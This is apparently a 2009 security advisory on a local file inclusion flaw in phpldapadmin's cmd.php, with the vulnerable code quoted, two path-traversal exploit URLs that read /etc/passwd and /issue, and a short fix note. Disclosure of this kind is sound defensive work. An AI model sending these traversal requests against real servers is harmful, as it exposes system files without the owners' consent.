phpldapadmin Local File Inclusion
=================================

########################################################################
#       PHPLDAPADMIN LOCAL FILE INCLUSION
########################################################################
 
author  : ipsecs
website : http://ipsecs.com
Date        : December, 10th, 2009
 
 
-[i]- Description
 
"Phpldapadmin is web based LDAP client which provides easy,
anywhere-accessible, multi-language administration for LDAP
server."
http://phpldapadmin.sourceforge.net
 
vulnerable version:
phpldapadmin 1.1.0.5
Ubuntu 8.10
Debian 5.0
Other version may be affected
 
-[ii]- Vulnerable Code
 
Vulnerable code is found in cmd.php which doesn&#039;t sanitize
URI parameter provided by user input.
 
line 10
$www[&#039;cmd&#039;] = get_request(&#039;cmd&#039;,&#039;REQUEST&#039;);
 
line 22-27
if (defined(&#039;HOOKSDIR&#039;) && file_exists(HOOKSDIR.$www[&#039;cmd&#039;].&#039;.php&#039;))
       $file = HOOKSDIR.$www[&#039;cmd&#039;].&#039;.php&#039;;
 
elseif (defined(&#039;HTDOCDIR&#039;) && file_exists(HTDOCDIR.$www[&#039;cmd&#039;].&#039;.php&#039;))
       $file = HTDOCDIR.$www[&#039;cmd&#039;].&#039;.php&#039;;
 
line 38-39
if ($file)
       include $file;
 
Attacker may view any arbitrary files trough &#039;cmd&#039; parameter
in URI request.
 
-[iii]- Exploit
 
http://server/phpldapadmin/cmd.php?cmd=../../../../etc/passwd%00
http://server/phpldapadmin/cmd.php?cmd=../../../../issue%00
 
-[iv]- Fix
 
Sanitize $file before being included. Unfortunaltely there is
no working patch at this time.



